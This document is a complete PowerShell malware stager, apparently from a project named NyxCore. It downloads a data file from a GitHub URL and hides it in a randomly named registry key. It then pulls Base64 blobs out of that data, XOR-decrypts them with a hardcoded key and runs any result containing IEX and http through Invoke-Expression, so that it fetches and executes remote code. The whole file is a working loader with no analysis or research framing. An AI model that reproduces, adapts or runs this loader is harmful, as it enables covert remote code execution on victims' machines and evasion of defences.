# Create random registry path
$regPath = "HKCU:\Software\" + (-join ((65..90) + (97..122) | Get-Random -Count 8 | ForEach-Object {[char]$_}))
New-Item -Path $regPath -Force | Out-Null

# Download the junk file from GitHub
$junkUrl = "https://raw.githubusercontent.com/h41th3m0x/NyxCore/refs/heads/main/NTUSER_junk.dat"
$junkContent = [System.Text.Encoding]::UTF8.GetString((New-Object Net.WebClient).DownloadData($junkUrl))

# Save to registry with fixed random name
$regName = "wIqa0kQsGLgjGawqsZBFUfwyoMhRzjcqJu5GY38rB3ZJBnB07T9"
Set-ItemProperty -Path $regPath -Name $regName -Value $junkContent -Force

# Wait random time (5-10 seconds)
$waitTime = Get-Random -Minimum 10 -Maximum 15
Start-Sleep -Seconds $waitTime

# Decryption function using BYTES for key
function Decrypt-XOR {
    param([string]$EncryptedBase64, [byte[]]$Key)
    try {
        $encryptedBytes = [System.Convert]::FromBase64String($EncryptedBase64)
        if ($encryptedBytes.Length -eq 0) { return $null }
        
        $keyBytes = $Key * (($encryptedBytes.Length / $Key.Length) + 1)
        $keyBytes = $keyBytes[0..($encryptedBytes.Length-1)]
        
        $decryptedBytes = New-Object byte[] $encryptedBytes.Length
        for ($i=0; $i -lt $encryptedBytes.Length; $i++) {
            $decryptedBytes[$i] = $encryptedBytes[$i] -bxor $keyBytes[$i]
        }
        
        return [System.Text.Encoding]::UTF8.GetString($decryptedBytes)
    }
    catch {
        return $null
    }
}

# Encryption key as BYTES (not string)
$encryptionKey = [System.Text.Encoding]::UTF8.GetBytes("NyXc0r_4dv4nc3d_M4lw4r3_2025_")

# Retrieve junk data from registry
$junkData = (Get-ItemProperty -Path $regPath -Name $regName).$regName

# Search for Base64 strings
$base64Pattern = '[A-Za-z0-9+/]{50,}={0,2}'
$matches = [regex]::Matches($junkData, $base64Pattern)

# Try to decrypt and execute each found payload
foreach ($match in $matches) {
    $decryptedCommand = Decrypt-XOR -EncryptedBase64 $match.Value -Key $encryptionKey
    
    if ($decryptedCommand -and $decryptedCommand.Contains("IEX") -and $decryptedCommand.Contains("http")) {     
        # Execute the decrypted command
        try {
            Invoke-Expression $decryptedCommand
            break
        }
        catch {}
    }
}